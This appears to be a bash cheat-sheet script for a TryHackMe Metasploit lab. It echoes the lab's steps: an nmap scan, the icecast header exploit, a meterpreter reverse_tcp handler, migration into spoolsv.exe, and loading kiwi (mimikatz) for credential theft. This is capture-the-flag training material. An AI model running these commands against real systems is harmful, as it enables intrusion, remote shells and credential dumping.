#!/bin/bash

# URL to to attack
MACHINE_IP=xxx.xx.xx.xxx
LOCAL_IP=xxx.xx.xx.xxx

case "$1" in
  # Run NMAP and feed results into our database
  1)
    # Make sure msfdb is initialized
    echo "start metasploit console => msfconsole"
    echo "db_nmap -sV $MACHINE_IP"
    ;;
  # Service running in port 135
  2)
    echo "msrpc"
    ;;
  # Get to know the path for a specific exploit
  3)
    echo "To know the path of the explot icecast"
    echo "search icecast => exploit/windows/http/icecast_header" 
    ;;
  # Using exploit/multi/handler
  4)
    echo "search multi/handler"
    echo "use #" # position listed
    echo "set PAYLOAD windows/meterpreter/reverse_tcp"
    # Check LOCAL_IP is the one from tryHackMe network
    echo "set LHOST $LOCAL_IP"
    echo "set RHOST $MACHINE_IP"
    echo "exploit"
    ;;
  5)
    echo "Run ps | grep spool => spoolsv.exe"
    echo "Migrate to the process => migrate PID"
    echo "Get user information => getuid"
    echo "Get system information => sysinfo"
    echo "Load mimikatz => load kiwi"
    ;;
  *)
    echo "Select proper step"
    ;;
esac
